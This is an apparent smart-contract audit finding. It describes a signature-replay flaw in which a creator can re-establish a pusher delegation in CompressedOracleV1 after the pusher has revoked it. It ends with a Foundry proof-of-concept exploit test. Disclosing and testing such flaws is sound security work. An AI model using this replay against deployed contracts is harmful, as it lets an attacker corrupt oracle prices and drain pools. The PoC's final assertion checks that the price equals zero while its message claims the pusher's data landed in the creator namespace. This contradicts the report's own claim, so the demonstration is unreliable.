### Title
Pusher Delegation Signature Replay After `revokePusher()` Allows Creator to Silently Re-establish Revoked Namespace Write Authority - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` accepts any EIP-191 consent signature that (a) recovers to the pusher address and (b) has not yet passed its deadline. There is no used-signature bitmap, no per-pusher nonce, and no on-chain record that a given `(pusher, creator, deadline)` tuple has already been consumed. After a pusher calls `revokePusher()` to clear `namespaceRemapping[pusher]`, the creator can immediately replay the original consent signature — with the same deadline — to re-establish the delegation without any fresh consent from the pusher. The pusher's revocation is silently undone.

---

### Finding Description

`allowPushers` signs over `(chainid, address(this), deadline, pusher, creator)`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The code comment explicitly acknowledges the risk: *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it"* — and states the deadline is the mitigation. [2](#0-1) 

But the deadline only prevents replay **after** it expires. Within the deadline window, the same bytes can be submitted to `allowPushers` an unlimited number of times. `revokePusher()` only zeroes `namespaceRemapping[msg.sender]`:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

It does not invalidate the signature, increment any nonce, or record the tuple as spent. The creator retains the original `bytes` from the first `allowPushers` call and can replay it at any time before the deadline to restore `namespaceRemapping[pusher] = creator`.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So after the creator replays the signature, every subsequent fallback push from the pusher lands in the creator's namespace again — even though the pusher believes they revoked and are writing to their own namespace.

---

### Impact Explanation

The `CompressedOracleV1` is the price source consumed by `AnchoredPriceProvider` and ultimately by `MetricOmmPool.swap`. A pusher who has revoked may begin pushing prices for a different asset, a different decimal scale, or a different market — because they believe they are writing to their own isolated namespace. The creator replays the old signature; those mismatched prices now overwrite the creator's namespace slots. Any pool anchored to those feed IDs executes swaps against the corrupted bid/ask, satisfying the **bad-price execution** impact gate: the pool receives less input than owed, or the trader receives more output than the oracle permits.

Additionally, the pusher's revocation is the only mechanism by which a pusher can withdraw consent. If revocation is silently undoable by the creator, the pusher has no reliable way to stop their key from writing into a namespace they no longer trust — a broken core oracle access-control invariant.

---

### Likelihood Explanation

The creator already holds the original `signatures` bytes from the first `allowPushers` call (they submitted it on-chain). Replaying requires a single transaction with no privileged role, no special timing beyond the deadline window, and no additional capital. Deadlines are set by the creator at delegation time and can be set far in the future (e.g., `block.timestamp + 365 days`). The pusher has no on-chain way to detect that their revocation has been undone. This is an unprivileged, low-cost, repeatable action.

---

### Recommendation

Track consumed `(pusher, creator, deadline)` tuples or maintain a per-pusher revocation nonce. The simplest fix is a `mapping(bytes32 => bool) private _usedConsents` keyed on the signed hash, set to `true` on first use and checked before `namespaceRemapping` is written. Alternatively, add a per-pusher `uint256 revocationNonce` that is incremented by `revokePusher()` and included in the signed domain, so any pre-revocation signature becomes invalid immediately after revocation regardless of deadline.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAfterRevokeTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayConsentAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — no fresh consent from pusher
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds!
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "delegation silently re-established without pusher consent");

        // 5. Pusher pushes prices thinking they go to own namespace;
        //    they actually land in creator's namespace (consumed by pool)
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = uint48((uint48(999_999) << 16) | (uint48(5) << 8) | uint48(3));
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(
            (uint256(tsMs) << 8) | uint256(0) | (uint256(raw) << 208)
        ));
        assertTrue(ok);
        // Price landed in creator namespace, not pusher namespace
        assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0,
            "creator namespace has pusher's price data");
    }
}
```
